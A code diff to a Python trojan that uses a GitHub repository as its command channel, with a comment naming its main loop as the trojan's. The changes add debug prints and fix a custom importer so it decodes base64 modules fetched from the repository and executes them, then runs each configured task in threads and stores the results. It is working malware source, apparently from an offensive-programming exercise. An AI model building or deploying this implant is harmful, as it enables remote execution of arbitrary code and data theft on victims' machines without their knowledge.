@@ -8,6 +8,7 @@ import threading
 import queue
 import os
 
+
 from github3 import login
 
 trojan_id = "abc"
@@ -31,17 +32,28 @@ class GitImporter(object):
 
 			if new_library is not None:
 				self.current_module_code = base64.b64decode(new_library)
+				
+				print("end_find")
+				
 				return self
 
 		return None
 
 	def load_module(self,name):
 
+		print("[*] load %s" % name)
+
 		module = imp.new_module(name)
 
-		exec(str(self.current_module_code in module.__dict__))
+		#exec(str(self.current_module_code in module.__dict__))
+		
+		print(self.current_module_code.decode('utf-8'))
+		
+		exec(self.current_module_code.decode('utf-8'))
 
 		sys.modules[name] = module
+		
+		print("end_load")
 
 		return module
 
@@ -64,6 +76,9 @@ def get_file_contents(filepath):
 			print("[*] Found file %s" % filepath)
 
 			blob = repo.blob(filename._json_data['sha'])
+			
+			print(blob)
+			
 			return blob.content
 
 	return None
@@ -77,11 +92,17 @@ def get_trojan_config():
 
 	for task in config:
 
+		print("find_module")
+
 		if task['module'] not in sys.modules:
 		
 			string = "import %s" % task['module']
+			
+			print("find_module_step2")
 		
 			exec(str(string))
+			
+			print("find_module_end")
 
 	return config
 
@@ -98,8 +119,7 @@ def store_module_result(data):
 def module_runner(module):
 	
 	task_queue.put(1)
-	print(dir(sys.modules[module]))
-	print((sys.modules[module]).test)
+	
 	result = sys.modules[module].run()
 	task_queue.get()
 
@@ -110,11 +130,22 @@ def module_runner(module):
 
 
 # トロイの木馬のメインループ
+
+print("start")
+
 sys.meta_path = [GitImporter()]
+
+print("metapath set")
 
 if task_queue.empty():
 
+		print("config read")
+
 		config = get_trojan_config()
+		
+		print(config)
+		
+		print("config read end")
 
 		for task in config:
 			t = threading.Thread(target=module_runner,args=(task['module'],))
